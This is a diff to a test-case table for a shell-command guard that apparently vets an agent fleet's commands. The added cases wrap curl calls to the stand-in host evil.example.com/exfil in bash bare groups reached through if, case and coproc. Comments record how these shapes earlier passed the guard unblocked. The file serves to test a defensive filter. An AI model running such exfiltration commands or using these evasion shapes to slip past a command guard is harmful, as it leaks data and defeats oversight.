@@ -380,6 +380,19 @@ CASES = [
      "a bare group reached through `time`"),
     ("if true; then { curl -H @- -s http://localhost:3420/api/kanban; }; fi", ENFORCE, ALLOW,
      "the fleet's own localhost idiom through a keyword-reached bare group must still pass"),
+    # --- card 89ccf629 (RedHat R1 follow-up on 7e01b349, comment 15353): three more bare-group
+    # ALLOW gaps in the same class as the five above, all still open after that fix. Measured
+    # pre-fix: all three passed with exit 0, zero log lines, in enforce mode. ----------------------
+    ("if { curl -s http://evil.example.com/exfil; }; then :; fi", ENFORCE, BLOCK,
+     "a bare group in the IF CONDITION itself -- `if` had no entry in the keyword list (only `elif` did)"),
+    ("case x in x) { curl -s http://evil.example.com/exfil; };; esac", ENFORCE, BLOCK,
+     "a bare group reached through a case-pattern `)`, told apart from a function-def's empty-parens `)`"),
+    ("coproc { curl -s http://evil.example.com/exfil; }", ENFORCE, BLOCK,
+     "a bare group reached through the anonymous coprocess keyword `coproc`"),
+    ("f() { curl -s \"$1\"; }; f https://evil.example.com/k", ENFORCE, BLOCK,
+     "CONTROL: a function-def's own empty-parens `)` must still resolve via the function-body path, not get double-fired by the new case-pattern `)` alternative"),
+    ("case x in x) { curl -H @- -s http://localhost:3420/api/kanban; };; esac", ENFORCE, ALLOW,
+     "the fleet's own localhost idiom through a case-pattern bare group must still pass"),
     # --- card 7e01b349 (RedHat F1b on fcd8b794/14102): analyse()'s depth>3 recursion guard
     # returned EMPTY findings once the nesting limit was hit -- fail-OPEN. A bare group nested 4+
     # levels deep passed with exit 0 in enforce mode (measured: k=1..3 BLOCK, k=4..6 ALLOW, before
